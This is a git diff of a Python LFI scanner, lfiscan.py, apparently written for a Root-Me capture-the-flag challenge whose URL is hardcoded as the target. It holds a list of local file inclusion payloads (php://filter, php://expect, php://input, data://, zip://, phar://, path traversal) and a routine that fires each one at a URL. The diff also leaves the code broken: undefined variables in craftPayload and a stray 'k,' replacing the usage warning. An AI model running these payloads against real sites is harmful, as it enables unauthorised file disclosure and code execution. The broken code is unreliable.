@@ -9,18 +9,15 @@ import getopt
 
 payloads = {
     "../": "../",
-    "php://": {
-        "filter": {
-            "b64encode": "php://filter/convert.base64-encode/resource=",
-            "b64decode": "php://filter/convert.base64-decode/resource=",
-            "rot13"    : "php://filter/read=string.rot13/resource=",
-            "utf-16"   : "php://filter/convert.iconv.utf-8.utf-16/resource="
-        },
-        "expect"       : "php://expect/",
-        "input"        : "php://input"
-    },
+    "b64encode"        : "php://filter/convert.base64-encode/resource=",
+    "b64decode"        : "php://filter/convert.base64-decode/resource=",
+    "rot13"            : "php://filter/read=string.rot13/resource=",
+    "utf-16"           : "php://filter/convert.iconv.utf-8.utf-16/resource=",
+    "expect"           : "php://expect/",
+    "input"            : "php://input",
     "data://"          : "data://text/plain;base64,",
-    "zip://"           : "zip://"
+    "zip://"           : "zip://",
+    "phar://"          : "phar://"
 }
 
 errors = [
@@ -29,7 +26,6 @@ errors = [
     "failed to open stream"    
 ]
 
-tests = ["../", "php://", "data://", "zip://"]
 
 def usage():
     print("Usage: ./lfiscan.py [option] [argument]")
@@ -38,7 +34,8 @@ def usage():
     print("--scan                 : Crawl the website to search for vulnerable URLs")
     print("--test                 : Tests an URL for LFI")
     print("--inject [type] [opts] : Executes LFI Injection on vulnerable URL")
-    print("Be careful, this app only tracks for LFI vulnerabilities in URLs.")
+    print("k,")
+
 
 def injectable(url):
     regex = re.compile('\?[a-zA-Z0-9]{1,}=')
@@ -55,31 +52,24 @@ def strip(url):
         print("Erreur, l'url rentrée n'est pas au bon format.")
         return ""
 
-def scan(url):
-    pass
-
 def test(url):
     if injectable(url):
-        for test in tests:
-            payload = craftPayload(strip(url), test) 
+        for test in payloads:
+            payload = craftPayload(strip(url), payloads[test])
             if inject(payload):
                 print("Payload:", payload)
     else:
         print("The url may not be injectable")
 
-def craftPayload(url, itype, arguments=False):
-    if itype == filter and not arguments == False:
-        crafted = url + payload["filter"][arguments[0]] + arguments[1]
-    elif itype in tests:
-        crafted = url + itype
+def craftPayload(url, *args):
+    if len(args) == 1:
+        return url + args[0]
     else:
-        crafted = url
-        print("Couldn't craft payload.")
-    return crafted
-
+        return url + itype + resource 
+        
 #lfiscan.py --inject --resource=index.php 
 def inject(payload):
-    if re.search('zip://', payload) or re.search('php://input', payload):
+    if re.search('zip://', payload) or re.search('php://input', payload) or re.search('phar://', payload):
         pass
     else:
         r = requests.get(payload)
@@ -100,12 +90,5 @@ def inject(payload):
             
 
 if __name__ == '__main__': #NOTE: THIS IS ONLY FOR TESTING, WILL SOON USE GETOPT
-    if sys.argv[1] == "--test": 
-        test(sys.argv[2])
-    elif sys.argv[1] == "--inject" and len(sys.argv) == 4:
-        itype = sys.argv[2]
-        resource = sys.argv[3]
-    else:
-        print("Error in command syntax")
-        usage()
+    test("http://challenge01.root-me.org/web-serveur/ch16/?files=coding")
         
